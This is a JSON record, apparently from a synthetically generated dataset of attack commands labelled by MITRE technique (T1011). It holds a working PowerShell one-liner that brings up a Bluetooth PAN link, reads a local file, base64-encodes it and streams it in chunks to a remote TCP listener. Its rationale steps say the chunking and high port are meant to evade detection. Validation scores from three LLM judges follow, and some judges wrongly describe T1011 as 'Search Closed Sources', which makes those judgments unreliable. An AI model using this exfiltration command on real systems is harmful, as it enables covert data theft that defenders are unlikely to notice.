{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
  "explanation": "Leverages Bluetooth PAN with a static IP and streams base64 in small chunks over a high TCP port to reduce anomalies on the alternate medium (T1011).",
  "rationale_steps": [
    "Establish Bluetooth NAP connectivity.",
    "Configure Bluetooth interface with a /30 to isolate routing.",
    "Bind TCP client to Bluetooth IP to ensure exfil over Bluetooth.",
    "Chunk base64 payload and transmit over a nonstandard port to evade simple detection."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1ad2f656",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax throughout, and appropriate variable usage.",
        "semantic_score": 4,
        "semantic_justification": "The command effectively implements exfiltration over an alternative protocol (Bluetooth) with proper connection setup, IP configuration, and chunked data transfer, though it's more aligned with T1011.001 (Exfiltration Over Other Network Medium) than general closed source searching.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T13:19:47.534141Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using standard PowerShell syntax, proper command separators, balanced quotes, and valid object methods and types.",
        "semantic_score": 1,
        "semantic_justification": "The command demonstrates data exfiltration of a local file over a Bluetooth Personal Area Network (PAN), which is fundamentally misaligned with T1011 'Search Closed Sources' that focuses on acquiring intelligence from external non-public sources.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T13:19:59.258776Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "The PowerShell one-liner is balanced and parseable with correct separators, quoting, and object usage, though the external BluetoothCL /connect argument may not be a valid flag.",
        "semantic_score": 3,
        "semantic_justification": "It conceptually performs exfiltration over a Bluetooth PAN (T1011) by setting a static IP and streaming base64 over TCP, but it likely fails without admin rights for netsh, may use the wrong Bluetooth tool/flags, and can misidentify the adapter, reducing operational plausibility.",
        "combined_score": 3.5,
        "confidence": 0.6,
        "timestamp": "2025-10-02T13:21:59.194417Z"
      }
    ],
    "llm_average_syntactic": 4.667,
    "llm_average_semantic": 2.667,
    "llm_average_score": 3.667,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}